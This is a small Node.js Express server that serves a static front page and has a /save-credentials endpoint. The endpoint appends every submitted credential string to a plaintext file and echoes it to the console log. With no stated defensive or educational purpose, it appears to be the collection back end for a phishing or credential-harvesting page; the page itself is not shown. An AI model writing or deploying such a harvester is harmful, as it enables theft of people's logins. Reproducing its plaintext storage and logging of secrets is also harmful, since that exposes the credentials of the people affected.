const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Middleware to parse plain text request bodies
app.use(bodyParser.text({ type: 'text/plain' }));

// Middleware to serve static files from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Handle POST request to save credentials
app.post('/save-credentials', (req, res) => {
  const credentials = req.body;

  // File path to save credentials
  const filePath = path.join(__dirname, 'credentials.txt');

  // Append credentials to file
  fs.appendFile(filePath, credentials + '\n', (err) => {
    if (err) {
      console.error('Error saving credentials:', err);
      res.status(500).send('Error saving credentials.');
    } else {
      console.log('Credentials saved:', credentials);
      res.status(200).send('Credentials saved successfully.');
    }
  });
});

// Serve index.html for the root URL
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});